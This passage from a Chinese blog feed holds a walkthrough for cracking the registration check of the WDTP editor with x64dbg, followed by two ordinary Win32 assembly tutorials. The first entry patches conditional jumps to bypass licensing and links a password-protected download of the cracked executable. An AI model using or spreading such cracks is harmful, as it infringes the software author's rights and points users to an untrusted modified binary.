    <content type="html"><![CDATA[<p>今天来讲讲WDTP这个软件的破解。</p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>WDTP 不止是一款开源免费的 GUI 桌面单机版静态网站生成器和简单方便的前端开发工具，更是一款跨平台的集笔记、个人知识管理、写作/创作、博客/网站内容与样式管理等功能于一体的多合一内容处理/管理器，同时还是一款高度追求用户体验与计算机文本编写良好感受的 Markdown 编辑器。该软件研发的核心思想是：简洁高效、轻灵优雅、先进强悍、操作简单。<br><a id="more"></a></p><h2 id="破解"><a href="#破解" class="headerlink" title="破解"></a>破解</h2><p>之前这个软件是开源的，后来作者把它闭源了，然后加上了注册机制，我今天测试了一下，在我写了十多篇文章之后我再添加就提示我需要注册。<br><img src="http://ww1.sinaimg.cn/large/c0264382gy1fou2567e65j20b0088t8y.jpg" alt=""><br>查一下壳，没有壳，64位的<br><img src="http://ww1.sinaimg.cn/large/c0264382gy1fou25yvsaxj20ei074q3n.jpg" alt=""><br>直接附加到x64dbg中，然后我们搜索一下字符串serial，可以找到错误提示的地方。<br><img src="http://ww1.sinaimg.cn/large/c0264382gy1fou27t4wefj213q0fetcj.jpg" alt=""><br>我们反汇编窗口中下个断，我们可以看到上方的ret，说明提示错误信息是跳转进来的，然后我们在段首下好断，重新注册可以找到调用这里的地方<br><img src="http://ww1.sinaimg.cn/large/c0264382gy1fou2buv9phj20fs06qaay.jpg" alt=""><br>我们跟过去<br><img src="http://ww1.sinaimg.cn/large/c0264382gy1fou2d3h9nvj20hc02zt8z.jpg" alt=""><br>可以看到错误提示的call，这个call上方有一个jmp可以跳过，说明在前方应该有一个跳转跳过了这个jmp，直接跳到了这个错误提示call。我们再往前看一点。<br><img src="http://ww1.sinaimg.cn/large/c0264382gy1fou2fedcjfj20m50chgnw.jpg" alt=""><br>我们可以看到上面的je，je前面的call是一个对比的call，爆破的话，我们不管这个，直接把je给nop掉。<br>然后我们执行，发现还是点击新建就会弹出来注册框，功能无法使用。<br>我们继续在字符串中找，可以看到窗口上面的Purchase，Question等等字符，可以发现错误提示的上面一段就是这个注册窗口弹出的一段，我们依旧在这个段的段首下段，然后找到调用它（弹注册窗）的地方。<br><img src="http://ww1.sinaimg.cn/large/c0264382gy1fou2xb5dm0j20ia03lgm3.jpg" alt=""><br>它是直接jmp下来的，我们可以看到上面有一个call之后跟着一个test然后一个jne，我们可以猜想是你新建文档的时候先比对一下你是否注册，然后根据结果跳转，我们直接把jne改成jmp试试，让它直接跳过弹注册窗口。<br><img src="http://ww1.sinaimg.cn/large/c0264382gy1fou33aziswj209q054q2u.jpg" alt=""><br>完美，现在新建没问题了。</p><h2 id="导出"><a href="#导出" class="headerlink" title="导出"></a>导出</h2><p>所以我们只需要把它的这个弹注册窗的地方直接jmp过就好，我们在我们修改的命令上面右键补丁<br><img src="http://ww1.sinaimg.cn/large/c0264382gy1fou352soi2j20ed0dbt90.jpg" alt=""><br>然后点击修复文件即可导出成一个破解版的exe。</p><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p>下载后注意校验信息<br>文件信息：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">文件版本: 1.1.1004</span><br><span class="line">修改时间: 2018年2月26日, 19:40:44</span><br><span class="line">MD5: 5B8DF3D4572842376EA850B8551DEEED</span><br><span class="line">SHA1: B282AC870E4159A2ACEA389015FE4F4409A0F887</span><br><span class="line">CRC32: F51675CE</span><br></pre></td></tr></table></figure></p><p><a href="https://share.weiyun.com/5f8f4a09b5fb84f23479479e661b0c69" target="_blank" rel="noopener">密码：h7b4ru</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;今天来讲讲WDTP这个软件的破解。&lt;/p&gt;
&lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;p&gt;WDTP 不止是一款开源免费的 GUI 桌面单机版静态网站生成器和简单方便的前端开发工具，更是一款跨平台的集笔记、个人知识管理、写作/创作、博客/网站内容与样式管理等功能于一体的多合一内容处理/管理器，同时还是一款高度追求用户体验与计算机文本编写良好感受的 Markdown 编辑器。该软件研发的核心思想是：简洁高效、轻灵优雅、先进强悍、操作简单。&lt;br&gt;
    
    </summary>
    
      <category term="逆向" scheme="http://hacktech.cn/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="逆向" scheme="http://hacktech.cn/tags/%E9%80%86%E5%90%91/"/>
    
      <category term="Tools" scheme="http://hacktech.cn/tags/Tools/"/>
    
  </entry>
  
  <entry>
    <title>Win32汇编学习(7)：鼠标输入消息</title>
    <link href="http://hacktech.cn/2018/02/09/Win32ASM7-Mouse-input-msg.html"/>
    <id>http://hacktech.cn/2018/02/09/Win32ASM7-Mouse-input-msg.html</id>
    <published>2018-02-09T14:29:19.000Z</published>
    <updated>2018-09-08T06:50:11.307Z</updated>
    
    <content type="html"><![CDATA[<p>这次我们将学习如何在我们的窗口过程函数中处理鼠标按键消息。例子演示了如何等待鼠标左键按下消息，我们将在按下的位置显示一个字符串。<br><a id="more"></a></p><h2 id="理论："><a href="#理论：" class="headerlink" title="理论："></a>理论：</h2><p>和处理键盘输入一样，WINDOWS将捕捉鼠标动作并把它们发送到相关窗口。这些活动包括左、右键按下、移动、双击、滚轮消息<code>WM_WHEEL</code>等。WINDOWS并不像处理键盘输入那样把所有的鼠标消息都导向有输入焦点的窗口，<strong>任何鼠标经过的窗口都将接收到鼠标消息，无论有否输入焦点</strong>。另外，窗口还会接收到鼠标在非客户区移动的消息（<code>WM_NCMOVE</code>），但大多数的情况下我们都会将其忽略掉。当鼠标在某窗口客户区移动时，该窗口将接收到<code>WM_MOUSEMOVE</code>消息。一个窗口若想处理<code>WM_LBUTTONDBCLK</code>或 <code>WM_RBUTTONDBCLK</code>，那么它的窗口类必须有<code>CS_DBLCLKS</code>风格，否则它就会接受到一堆的按键起落（<code>WM_XBUTTONDOWN</code>或<code>WM_XBUTTONUP</code>)的消息。 对于所有的消息，<strong>窗口过程函数传入的参数<code>lParam</code>包含了鼠标的位置，其中低位为x坐标，高位为y坐标</strong>，这些坐标值都是相对于窗口客户区的左上角的值，<code>wParam</code>中则包含了鼠标按钮的状态。 </p><h2 id="例子："><a href="#例子：" class="headerlink" title="例子："></a>例子：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">.386 </span><br><span class="line">.model flat,stdcall </span><br><span class="line">option casemap:none </span><br><span class="line">WinMain proto :DWORD,:DWORD,:DWORD,:DWORD </span><br><span class="line"></span><br><span class="line">include \masm32\include\windows.inc </span><br><span class="line">include \masm32\include\user32.inc </span><br><span class="line">include \masm32\include\kernel32.inc </span><br><span class="line">include \masm32\include\gdi32.inc </span><br><span class="line">includelib \masm32\lib\user32.lib </span><br><span class="line">includelib \masm32\lib\kernel32.lib </span><br><span class="line">includelib \masm32\lib\gdi32.lib </span><br><span class="line"></span><br><span class="line">.data </span><br><span class="line">ClassName db &quot;SimpleWinClass&quot;,0 </span><br><span class="line">AppName  db &quot;Our First Window&quot;,0 </span><br><span class="line">MouseClick db 0</span><br><span class="line"></span><br><span class="line">.data? </span><br><span class="line">hInstance HINSTANCE ? </span><br><span class="line">CommandLine LPSTR ? </span><br><span class="line">hitpoint POINT &lt;&gt; </span><br><span class="line"></span><br><span class="line">.code </span><br><span class="line">start: </span><br><span class="line">    invoke GetModuleHandle, NULL </span><br><span class="line">    mov    hInstance,eax </span><br><span class="line">    invoke GetCommandLine</span><br><span class="line">    mov CommandLine,eax </span><br><span class="line">    invoke WinMain, hInstance,NULL,CommandLine, SW_SHOWDEFAULT </span><br><span class="line">    invoke ExitProcess,eax </span><br><span class="line"></span><br><span class="line">WinMain proc hInst:HINSTANCE,hPrevInst:HINSTANCE,CmdLine:LPSTR,CmdShow:DWORD </span><br><span class="line">    LOCAL wc:WNDCLASSEX </span><br><span class="line">    LOCAL msg:MSG </span><br><span class="line">    LOCAL hwnd:HWND </span><br><span class="line">    mov   wc.cbSize,SIZEOF WNDCLASSEX </span><br><span class="line">    mov   wc.style, CS_HREDRAW or CS_VREDRAW </span><br><span class="line">    mov   wc.lpfnWndProc, OFFSET WndProc </span><br><span class="line">    mov   wc.cbClsExtra,NULL </span><br><span class="line">    mov   wc.cbWndExtra,NULL </span><br><span class="line">    push  hInst </span><br><span class="line">    pop   wc.hInstance </span><br><span class="line">    mov   wc.hbrBackground,COLOR_WINDOW+1 </span><br><span class="line">    mov   wc.lpszMenuName,NULL </span><br><span class="line">    mov   wc.lpszClassName,OFFSET ClassName </span><br><span class="line">    invoke LoadIcon,NULL,IDI_APPLICATION </span><br><span class="line">    mov   wc.hIcon,eax </span><br><span class="line">    mov   wc.hIconSm,eax </span><br><span class="line">    invoke LoadCursor,NULL,IDC_ARROW </span><br><span class="line">    mov   wc.hCursor,eax </span><br><span class="line">    invoke RegisterClassEx, addr wc </span><br><span class="line">    invoke CreateWindowEx,NULL,ADDR ClassName,ADDR AppName,\ </span><br><span class="line">           WS_OVERLAPPEDWINDOW,CW_USEDEFAULT,\ </span><br><span class="line">           CW_USEDEFAULT,CW_USEDEFAULT,CW_USEDEFAULT,NULL,NULL,\ </span><br><span class="line">           hInst,NULL </span><br><span class="line">    mov   hwnd,eax </span><br><span class="line">    invoke ShowWindow, hwnd,SW_SHOWNORMAL </span><br><span class="line">    invoke UpdateWindow, hwnd </span><br><span class="line">    .WHILE TRUE </span><br><span class="line">                invoke GetMessage, ADDR msg,NULL,0,0 </span><br><span class="line">                .BREAK .IF (!eax) </span><br><span class="line">                invoke DispatchMessage, ADDR msg </span><br><span class="line">    .ENDW </span><br><span class="line">    mov     eax,msg.wParam </span><br><span class="line">    ret </span><br><span class="line">WinMain endp </span><br><span class="line"></span><br><span class="line">WndProc proc hWnd:HWND, uMsg:UINT, wParam:WPARAM, lParam:LPARAM </span><br><span class="line">    LOCAL hdc:HDC </span><br><span class="line">    LOCAL ps:PAINTSTRUCT </span><br><span class="line"></span><br><span class="line">    .IF uMsg==WM_DESTROY </span><br><span class="line">        invoke PostQuitMessage,NULL </span><br><span class="line">    .ELSEIF uMsg==WM_LBUTTONDOWN </span><br><span class="line">        mov eax,lParam </span><br><span class="line">        and eax,0FFFFh </span><br><span class="line">        mov hitpoint.x,eax </span><br><span class="line">        mov eax,lParam </span><br><span class="line">        shr eax,16 </span><br><span class="line">        mov hitpoint.y,eax </span><br><span class="line">        mov MouseClick,TRUE </span><br><span class="line">        invoke InvalidateRect,hWnd,NULL,TRUE </span><br><span class="line">    .ELSEIF uMsg==WM_PAINT </span><br><span class="line">        invoke BeginPaint,hWnd, ADDR ps </span><br><span class="line">        mov    hdc,eax </span><br><span class="line">        .IF MouseClick </span><br><span class="line">            invoke lstrlen,ADDR AppName </span><br><span class="line">            invoke TextOut,hdc,hitpoint.x,hitpoint.y,ADDR AppName,eax </span><br><span class="line">        .ENDIF </span><br><span class="line">        invoke EndPaint,hWnd, ADDR ps </span><br><span class="line">    .ELSE </span><br><span class="line">        invoke DefWindowProc,hWnd,uMsg,wParam,lParam </span><br><span class="line">        ret </span><br><span class="line">    .ENDIF </span><br><span class="line">    xor    eax,eax </span><br><span class="line">    ret </span><br><span class="line">WndProc endp </span><br><span class="line">end start</span><br></pre></td></tr></table></figure><h2 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.ELSEIF uMsg==WM_LBUTTONDOWN </span><br><span class="line">    mov eax,lParam </span><br><span class="line">    and eax,0FFFFh </span><br><span class="line">    mov hitpoint.x,eax </span><br><span class="line">    mov eax,lParam </span><br><span class="line">    shr eax,16 </span><br><span class="line">    mov hitpoint.y,eax </span><br><span class="line">    mov MouseClick,TRUE </span><br><span class="line">    invoke InvalidateRect,hWnd,NULL,TRUE</span><br></pre></td></tr></table></figure><p>窗口过程处理了<code>WM_LBUTTONDOWN</code>消息，当接收到该消息时，<code>lParam</code>中包含了相对于窗口客户区左上角的坐标，我们把它保存下来，放到一个结构体变量（POINT）中，该结构体变量的定义如下： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POINT STRUCT </span><br><span class="line">    x   dd ? </span><br><span class="line">    y   dd ? </span><br><span class="line">POINT ENDS</span><br></pre></td></tr></table></figure><p>然后我们把标志量<code>MouseClick</code>设为<code>TRUE</code>，这表明至少有一次在客户区的左键按下消息。 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov eax,lParam </span><br><span class="line">and eax,0FFFFh </span><br><span class="line">mov hitpoint.x,eax</span><br></pre></td></tr></table></figure><p>由于<code>lParam</code>是一个32位长的数，其中高、低16位分别包括了y、x坐标所以我们做一些小处理，以便保存它们。 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shr eax,16 </span><br><span class="line">mov hitpoint.y,eax</span><br></pre></td></tr></table></figure><p>保存完坐标后我们设标志<code>MouseClick</code>为<code>TRUE</code>，这是在处理<code>WM_PAINT</code>时用来判断是否有鼠标左键按下消息。然后我们调用<code>InvalidateRect</code>函数迫使WINDOWS重新绘制客户区。 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.IF MouseClick </span><br><span class="line">    invoke lstrlen,ADDR AppName </span><br><span class="line">    invoke TextOut,hdc,hitpoint.x,hitpoint.y,ADDR AppName,eax </span><br><span class="line">.ENDIF</span><br></pre></td></tr></table></figure><p>绘制客户区的代码首先检测<code>MouseClick</code>标志位，再决定是否重绘。因为我们在首次显示窗口时还没有左键按下的消息，所以我们在初始时把该标志设为<code>FALSE</code>，告诉WINDOWS不要重绘客户区，当有左键按下的消息时，它会在鼠标按下的位置绘制字符串。注意在调用<code>TextOut</code>函数时，其关于字符串长度的参数是调用<code>lstrlen</code>函数来计算的。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这次我们将学习如何在我们的窗口过程函数中处理鼠标按键消息。例子演示了如何等待鼠标左键按下消息，我们将在按下的位置显示一个字符串。&lt;br&gt;
    
    </summary>
    
      <category term="汇编(ASM)" scheme="http://hacktech.cn/categories/%E6%B1%87%E7%BC%96-ASM/"/>
    
    
      <category term="ASM" scheme="http://hacktech.cn/tags/ASM/"/>
    
      <category term="读书笔记" scheme="http://hacktech.cn/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
      <category term="Windows" scheme="http://hacktech.cn/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>Win32汇编学习(6)：键盘输入消息</title>
    <link href="http://hacktech.cn/2018/02/08/Win32ASM6-Keyboard-input-msg.html"/>
    <id>http://hacktech.cn/2018/02/08/Win32ASM6-Keyboard-input-msg.html</id>
    <published>2018-02-08T09:53:59.000Z</published>
    <updated>2018-09-08T06:50:11.307Z</updated>
    
    <content type="html"><![CDATA[<p>这次，我们将要学习WINDOWS程序是如何处理键盘消息的。<br><a id="more"></a></p><h2 id="理论："><a href="#理论：" class="headerlink" title="理论："></a>理论：</h2><p>因为大多数的PC只有一个键盘，所以所有运行中的WINDOWS程序必须共用它。<strong>WINDOWS 将负责把击键消息送到具有输入焦点的那个应用程序中去</strong>。尽管屏幕上可能同时有几个应用程序窗口，但一个时刻仅有一个窗口有输入焦点。有输入焦点的那个应用程序的标题条总是高亮度显示的。 实际上您可以从两个角度来看键盘消息：一是您可以把它看成是一大堆的按键消息的集合，在这种情况下，当您按下一个键时，WINDOWS就会发送一个 <code>WM_KEYDOWN</code> 给有输入焦点的那个应用程序，提醒它有一个键被按下。当您释放键时，WINDOWS又会发送一个 <code>WM_KYEUP</code> 消息，告诉有一个键被释放。您把每一个键当成是一个按钮；另一种情况是：您可以把键盘看成是字符输入设备。当您按下“a”键时，WINDOWS发送一个 <code>WM_CHAR</code> 消息给有输入焦点的应用程序，告诉它“a”键被按下。实际上WINDOWS 内部发送 <code>WM_KEYDOWN</code> 和 <code>WM_KEYUP</code> 消息给有输入焦点的应用程序，而这些消息将通过调用 <code>TranslateMessage</code> 翻译成 <code>WM_CHAR</code> 消息。WINDOWS窗口过程函数将决定是否处理所收到的消息，一般说来您不大会去处理 <code>WM_KEYDOWN</code> 、 <code>WM_KEYUP</code> 消息，在消息循环中 <code>TranslateMessage</code> 函数会把上述消息转换成 <code>WM_CHAR</code> 消息。这次学习中将只处理 <code>WM_CHAR</code>。 </p><h2 id="例子："><a href="#例子：" class="headerlink" title="例子："></a>例子：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">.386</span><br><span class="line">.model flat,stdcall</span><br><span class="line">option casemap:none</span><br><span class="line"></span><br><span class="line">WinMain proto :DWORD,:DWORD,:DWORD,:DWORD</span><br><span class="line"></span><br><span class="line">include windows.inc</span><br><span class="line">include user32.inc</span><br><span class="line">include kernel32.inc</span><br><span class="line">include gdi32.inc</span><br><span class="line">includelib user32.lib</span><br><span class="line">includelib kernel32.lib</span><br><span class="line">includelib gdi32.lib</span><br><span class="line"></span><br><span class="line">.data</span><br><span class="line">ClassName db &quot;SimpleWinClass&quot;,0</span><br><span class="line">AppName   db &quot;Our Fourth Window&quot;,0</span><br><span class="line">char WPARAM 20h</span><br><span class="line"></span><br><span class="line">.data?</span><br><span class="line">hInstance HINSTANCE ?</span><br><span class="line">CommandLine LPSTR ?</span><br><span class="line"></span><br><span class="line">.code</span><br><span class="line">start:</span><br><span class="line">invoke GetModuleHandle,NULL</span><br><span class="line">mov    hInstance,eax</span><br><span class="line">invoke GetCommandLine</span><br><span class="line">mov    CommandLine,eax</span><br><span class="line">invoke WinMain,hInstance,NULL,CommandLine,SW_SHOWDEFAULT</span><br><span class="line">invoke ExitProcess,eax</span><br><span class="line"></span><br><span class="line">WinMain proc hInst:HINSTANCE,hPrevInst:HINSTANCE,CmdLine:LPSTR,CmdShow:DWORD</span><br><span class="line">    </span><br><span class="line">    LOCAL wc:WNDCLASSEX</span><br><span class="line">    LOCAL msg:MSG</span><br><span class="line">    LOCAL hwnd:HWND</span><br><span class="line">    mov wc.cbSize,SIZEOF WNDCLASSEX</span><br><span class="line">    mov wc.style,CS_HREDRAW or CS_VREDRAW</span><br><span class="line">    mov wc.lpfnWndProc,OFFSET WndProc</span><br><span class="line">    mov wc.cbClsExtra,NULL</span><br><span class="line">    mov wc.cbWndExtra,NULL</span><br><span class="line">    push hInst</span><br><span class="line">    pop wc.hInstance</span><br><span class="line">    mov wc.hbrBackground,COLOR_WINDOW+1</span><br><span class="line">    mov wc.lpszMenuName,NULL</span><br><span class="line">    mov wc.lpszClassName,OFFSET ClassName</span><br><span class="line">    invoke LoadIcon,NULL,IDI_APPLICATION</span><br><span class="line">    mov wc.hIcon,eax</span><br><span class="line">    mov wc.hIconSm,eax</span><br><span class="line">    invoke LoadCursor,NULL,IDC_ARROW</span><br><span class="line">    mov wc.hCursor,eax</span><br><span class="line">    invoke RegisterClassEx,ADDR wc</span><br><span class="line">    invoke CreateWindowEx,NULL,ADDR ClassName,ADDR AppName,\</span><br><span class="line">                        WS_OVERLAPPEDWINDOW,CW_USEDEFAULT,CW_USEDEFAULT,\</span><br><span class="line">                        CW_USEDEFAULT,CW_USEDEFAULT,NULL,NULL,hInst,NULL</span><br><span class="line">    mov hwnd,eax</span><br><span class="line">    invoke ShowWindow,hwnd,SW_SHOWNORMAL</span><br><span class="line">    invoke UpdateWindow,hwnd</span><br><span class="line">    .while TRUE</span><br><span class="line">        invoke GetMessage,ADDR msg,NULL,0,0</span><br><span class="line">        .break .if (!eax)</span><br><span class="line">        invoke TranslateMessage,ADDR msg</span><br><span class="line">        invoke DispatchMessage,ADDR msg</span><br><span class="line">    .endw</span><br><span class="line">    mov eax,msg.wParam</span><br><span class="line">    ret</span><br><span class="line"></span><br><span class="line">WinMain endp </span><br><span class="line"></span><br><span class="line">WndProc proc hWnd:HWND,uMsg:UINT,wParam:WPARAM,lParam:LPARAM</span><br><span class="line">    </span><br><span class="line">    LOCAL hdc:HDC</span><br><span class="line">    LOCAL ps:PAINTSTRUCT</span><br><span class="line">    </span><br><span class="line">    .if uMsg==WM_DESTROY</span><br><span class="line">        invoke PostQuitMessage,NULL</span><br><span class="line">    .elseif uMsg==WM_CHAR</span><br><span class="line">        push wParam</span><br><span class="line">        pop  char</span><br><span class="line">        invoke InvalidateRect,hWnd,NULL,TRUE</span><br><span class="line">    .elseif uMsg==WM_PAINT</span><br><span class="line">        invoke BeginPaint,hWnd,ADDR ps</span><br><span class="line">        mov    hdc,eax</span><br><span class="line">        invoke TextOut,hdc,0,0,ADDR char,1</span><br><span class="line">        invoke EndPaint,hWnd,ADDR ps</span><br><span class="line">    .else</span><br><span class="line">        invoke DefWindowProc,hWnd,uMsg,wParam,lParam</span><br><span class="line">        ret</span><br><span class="line">    .endif</span><br><span class="line">    xor eax,eax</span><br><span class="line">    ret</span><br><span class="line"></span><br><span class="line">WndProc endp</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><h2 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">char WPARAM 20h</span><br></pre></td></tr></table></figure><p>这个变量将保存从键盘接收到的字符。因为它是在窗口过程中通过WPARAM型变量传送的，所以我们简单地把它定义为WPARAM型。<strong>由于我们的窗口在初次刷新时(也即刚被创建的那一次)是没有键盘输入的所以我们把他设成空格符（20h），这样显示时您就什么都看不见。</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.ELSEIF uMsg==WM_CHAR </span><br><span class="line">    push wParam </span><br><span class="line">    pop  char </span><br><span class="line">    invoke InvalidateRect, hWnd,NULL,TRUE</span><br></pre></td></tr></table></figure><p>这一段是用来处理<code>WM_CHAR</code>消息的。它把接收到的字符放入变量<code>char</code>中，接着调用<code>InvalidateRect</code>，而InvalidateRect使得窗口的客户区无效，这样它会发出WM_PAINT消息，而WM_PAINT消息迫使WINDOWS重新绘制它的客户区。该函数的语法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">InvalidateRect proto hWnd:HWND, lpRect:DWORD, bErase:DWORD</span><br></pre></td></tr></table></figure><p><code>lpRect</code>是指向客户区我们想要其无效的一个正方形结构体的指针。如果该值等于<code>NULL</code>，则整个客户区都无效；布尔值<code>bErase</code>告诉WINDOWS是否擦除背景，如果是TRUE，则WINDOWS在调用BeginPaint函数时把背景擦掉。 所以我们此处的做法是：<strong>我们将保存所有有关重绘客户区的数据，然后发送<code>WM_PAINT</code>消息(通过<code>InvalidateRect</code>)，处理该消息的程序段然后根据相关数据重新绘制客户区。实际上我们完全可以通过调用 <code>GetDC</code> 获得设备上下文句柄，然后绘制字符，然后再调用<code>ReleaseDC</code>释放设备上下文句柄，毫无疑问这样也能在客户区绘制出正确的字符。但是如果这之后接收到<code>WM_PAINT</code>消息要处理时，客户区会重新刷新，而我们这稍前所绘制的字符就会消失掉。所以为了让字符一直正确地显示，就必须把它们放到<code>WM_PAINT</code>的处理过程中处理。而在本消息处理中发送<code>WM_PAINT</code>消息即可。</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">invoke TextOut,hdc,0,0,ADDR char,1</span><br></pre></td></tr></table></figure><p><strong>在调用<code>InvalidateRect</code>时，<code>WM_PAINT</code>消息被发送到了WINDOWS窗口处理过程，程序流程转移到处理<code>WM_PAINT</code>消息的程序段</strong>，然后调用<code>BeginPaint</code>得到设备上下文的句柄，再调用<code>TextOut</code>在客户区的（0，0）处输出保存的按键字符。这样无论您按什么键都能在客户区的左上角显示，不仅如此，无论您怎么缩放窗口（迫使WINDOWS重新绘制它的客户区），字符都会在正确的地方显示，所以<strong>必须把所有重要的绘制动作都放到处理<code>WM_PAINT</code>消息的程序段中去</strong>。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这次，我们将要学习WINDOWS程序是如何处理键盘消息的。&lt;br&gt;
    
    </summary>
    
      <category term="汇编(ASM)" scheme="http://hacktech.cn/categories/%E6%B1%87%E7%BC%96-ASM/"/>
    
    
      <category term="ASM" scheme="http://hacktech.cn/tags/ASM/"/>
    
      <category term="读书笔记" scheme="http://hacktech.cn/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
      <category term="Windows" scheme="http://hacktech.cn/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>Win32汇编学习(5)：绘制文本2</title>
